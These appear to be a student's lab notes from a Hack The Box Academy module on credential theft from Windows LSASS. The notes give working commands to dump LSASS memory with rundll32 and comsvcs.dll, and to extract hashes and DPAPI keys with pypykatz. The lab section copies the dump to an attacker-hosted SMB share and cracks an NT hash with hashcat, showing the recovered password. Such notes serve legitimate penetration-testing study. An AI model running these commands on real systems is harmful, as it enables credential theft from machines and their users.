# Attack LSASS

LSASS will:

- Cache credentials locally in memory
- Create access tokens
- Enforce security policies
- Write to Windows security log

## Dumping LSASS Process Memory

Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file

-> C:\Users\loggedonusersdirectory\AppData\Local\Temp\lsass.DMP

## Rundll32.exe & Comsvcs.dll Method

Alternative method to the GUI-based interactive : useful if we only have a shell on the target machine &  more flexible.

-> modern antivirus should recognize this method.

### Finding LSASS PID in cmd

CMD :
tasklist /svc
Powershell :
Get-Process lsass

### Creating lsass.dmp using PowerShell

rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

672 = PID founded

## Using Pypykatz to Extract Credentials

Pypykatz =  implementation of Mimikatz for Linux

LSASS process memory into the file = "snapshot" of active logon session

pypykatz lsa minidump /home/lsass.dmp

-> MSV = authentication package in Windows that LSA calls on to validate logon attempts
-> WDIGEST = older authentication protocol enabled by default in Windows XP - Windows 8 (LSASS caches credentials used by WDIGEST in clear-text)
-> Kerberos = network authentication protocol used by Active Directory in Windows Domain environments
-> DPAPI = set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications (for example : username and password for saved sites on Internet Explorer, Google Chrome, Outlook, RDP, Wireless Networks, VPN, ...)

Pypykatz can extract the DPAPI masterkey for the logged-on user whose data is present in LSASS process memory

## Cracking the NT Hash with Hashcat

sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

# LAB

xfreerdp /u:htb-student /p:"HTB_@cademy_stdnt!" /v:$TARGET
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 664 C:\lsass.dmp full

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/

move lsass.dmp \\10.10.14.104\CompData

pypykatz lsa minidump /home/lsass.dmp

sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt

31f87811133bc6aaa75a536e77f64314:Mic@123
